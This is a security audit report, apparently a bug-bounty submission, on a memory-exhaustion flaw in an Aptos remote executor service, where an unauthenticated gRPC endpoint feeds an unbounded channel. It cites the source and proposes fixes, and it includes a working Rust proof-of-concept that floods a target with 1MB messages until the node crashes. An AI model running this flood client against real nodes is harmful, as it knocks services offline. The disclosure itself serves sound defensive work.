# Audit Report

## Title
Unbounded Channel Memory Exhaustion in Remote Executor Service via Unauthenticated GRPC Endpoint

## Summary
The `create_inbound_channel` function creates an unbounded crossbeam channel that receives messages from an unauthenticated GRPC endpoint. An attacker can flood this channel faster than handlers can process messages, causing unbounded memory growth and node crashes, leading to total loss of liveness in the remote executor service.

## Finding Description

The vulnerability exists in a chain of security failures across the remote executor network stack:

**1. Unbounded Channel Creation**

The `create_inbound_channel` function creates an unbounded crossbeam channel without any capacity constraints: [1](#0-0) 

**2. Unauthenticated GRPC Message Reception**

Messages from the network are received through a GRPC endpoint that performs NO authentication or authorization checks: [2](#0-1) 

The `simple_msg_exchange` method directly sends any received message to the unbounded channel without validating the sender or implementing rate limiting.

**3. Critical Usage in Block Execution**

This channel is used for critical block execution coordination in the remote executor service: [3](#0-2) 

The executor service receives execution commands through this channel and processes them in `receive_execute_command`: [4](#0-3) 

**Attack Execution Path:**

1. Attacker discovers executor shard GRPC endpoints (e.g., via port scanning or leaked configuration)
2. Attacker crafts GRPC `NetworkMessage` requests with correct `message_type` values (e.g., `"execute_command_0"`, `"execute_command_1"`)
3. Attacker sends messages in rapid succession to the `simple_msg_exchange` endpoint
4. Each message is immediately pushed into the unbounded channel (no backpressure)
5. If messages arrive faster than `receive_execute_command()` can process them (which is likely given the complex block execution logic), the channel queue grows indefinitely
6. Memory exhaustion occurs, causing the executor shard to crash via OOM

**Invariants Broken:**
- **Resource Limits**: "All operations must respect gas, storage, and computational limits" - unbounded memory growth violates this
- **System Availability**: The system fails to protect against resource exhaustion attacks

## Impact Explanation

**Critical Severity** per Aptos Bug Bounty criteria:

This vulnerability enables **"Total loss of liveness/network availability"** through the following impacts:

1. **Executor Shard Crashes**: Attackers can crash individual executor shards through memory exhaustion, preventing block execution on those shards

2. **Sharded Execution Failures**: The remote executor service coordinates parallel block execution across shards. If sufficient shards are crashed, the entire sharded execution system fails

3. **Block Processing Halts**: Without functional executor shards, the system cannot process blocks, causing complete liveness failure

4. **No Recovery Mechanism**: The code has no circuit breakers, memory limits, or automatic recovery - crashed nodes require manual intervention

5. **Amplification Attack**: A single attacker can target multiple executor shards simultaneously, multiplying the impact

The attack requires no privileged access, no validator collusion, and can be executed with minimal resources (simple GRPC client). The impact is immediate and severe.

## Likelihood Explanation

**Very High Likelihood:**

1. **No Authentication Barrier**: The GRPC endpoint has zero authentication - any network peer can send messages

2. **Easy Discovery**: Executor service addresses are configured and may be discoverable through:
   - Configuration files
   - Network scanning
   - Error messages leaking addresses

3. **Trivial Exploit**: Attacker only needs:
   - GRPC client library (widely available)
   - Knowledge of message types (observable or guessable: `"execute_command_{shard_id}"`)
   - Network connectivity to the target

4. **No Rate Limiting**: Confirmed absence of any rate limiting mechanism in the codebase: [5](#0-4) 

5. **Direct Channel Send**: Messages go directly from network to unbounded queue with no validation

6. **Slow Processing Path**: Block execution involves complex operations (state prefetching, VM execution, result serialization), creating a natural processing bottleneck that attackers can exploit

## Recommendation

**Immediate Mitigations:**

1. **Replace Unbounded Channel with Bounded Channel:**

```rust
pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
    // Use bounded channel with reasonable capacity
    const CHANNEL_CAPACITY: usize = 1000;
    let (inbound_sender, inbound_receiver) = bounded(CHANNEL_CAPACITY);

    self.inbound_handler
        .lock()
        .unwrap()
        .register_handler(message_type, inbound_sender);

    inbound_receiver
}
```

2. **Add Authentication to GRPC Endpoint:**

Implement mutual TLS or token-based authentication on the `simple_msg_exchange` endpoint to verify callers are authorized executor service components.

3. **Implement Rate Limiting:**

Add per-peer rate limiting in the GRPC service:

```rust
async fn simple_msg_exchange(
    &self,
    request: Request<NetworkMessage>,
) -> Result<Response<Empty>, Status> {
    let remote_addr = request.remote_addr();
    
    // Check rate limit before processing
    if !self.rate_limiter.check_and_update(remote_addr) {
        return Err(Status::resource_exhausted("Rate limit exceeded"));
    }
    
    // ... existing message handling ...
}
```

4. **Add Backpressure Handling:**

Use `try_send()` instead of `send().unwrap()` to detect channel saturation and reject messages gracefully rather than panicking: [6](#0-5) 

5. **Add Circuit Breakers:**

Implement monitoring to detect abnormal queue growth and temporarily reject new messages when thresholds are exceeded.

**Long-term Solutions:**

- Redesign the remote executor architecture with proper authentication and authorization
- Implement end-to-end flow control across the distributed execution system
- Add comprehensive monitoring and alerting for channel queue depths

## Proof of Concept

```rust
// PoC: Malicious GRPC client that floods the executor service
// Compile with: cargo build
// Run against target executor at: cargo run -- <target_ip:port>

use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use tokio::time::{sleep, Duration};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "http://127.0.0.1:52200".to_string());

    println!("[*] Connecting to target executor: {}", target);
    let mut client = NetworkMessageServiceClient::connect(target).await?;

    println!("[*] Starting flood attack...");
    
    // Flood the channel with messages for execute_command_0
    let mut count = 0u64;
    loop {
        let flood_message = NetworkMessage {
            message: vec![0u8; 1024 * 1024], // 1MB garbage payload
            message_type: "execute_command_0".to_string(),
        };

        match client.simple_msg_exchange(flood_message).await {
            Ok(_) => {
                count += 1;
                if count % 100 == 0 {
                    println!("[+] Sent {} messages - target memory should be growing", count);
                }
            }
            Err(e) => {
                println!("[!] Error: {} - target may have crashed!", e);
                break;
            }
        }

        // Send messages as fast as possible (no delay)
        // This overwhelms the processing rate
    }

    Ok(())
}
```

**Expected Results:**
1. Run the PoC against a running executor service
2. Monitor target node memory with `top` or similar
3. Observe unbounded memory growth as messages accumulate in the channel
4. Target node crashes with OOM within minutes (depending on available memory)
5. Executor service becomes unavailable, blocking block execution

**Notes:**
- The attack works because crossbeam's `unbounded()` channel has no memory limit
- The GRPC endpoint accepts messages from any source without authentication
- Processing block execution commands is slow compared to network message arrival rate
- No rate limiting or backpressure mechanism exists to prevent queue buildup

### Citations

**File:** secure/net/src/network_controller/mod.rs (L128-137)
```rust
    pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
        let (inbound_sender, inbound_receiver) = unbounded();

        self.inbound_handler
            .lock()
            .unwrap()
            .register_handler(message_type, inbound_sender);

        inbound_receiver
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L34-34)
```rust
        let command_rx = controller.create_inbound_channel(execute_command_type);
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L80-112)
```rust
    fn receive_execute_command(&self) -> ExecutorShardCommand<RemoteStateViewClient> {
        match self.command_rx.recv() {
            Ok(message) => {
                let _rx_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx"])
                    .start_timer();
                let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx_bcs_deser"])
                    .start_timer();
                let request: RemoteExecutionRequest = bcs::from_bytes(&message.data).unwrap();
                drop(bcs_deser_timer);

                match request {
                    RemoteExecutionRequest::ExecuteBlock(command) => {
                        let init_prefetch_timer = REMOTE_EXECUTOR_TIMER
                            .with_label_values(&[&self.shard_id.to_string(), "init_prefetch"])
                            .start_timer();
                        let state_keys = Self::extract_state_keys(&command);
                        self.state_view_client.init_for_block(state_keys);
                        drop(init_prefetch_timer);

                        let (sub_blocks, concurrency, onchain_config) = command.into();
                        ExecutorShardCommand::ExecuteSubBlocks(
                            self.state_view_client.clone(),
                            sub_blocks,
                            concurrency,
                            onchain_config,
                        )
                    },
                }
            },
            Err(_) => ExecutorShardCommand::Stop,
        }
```
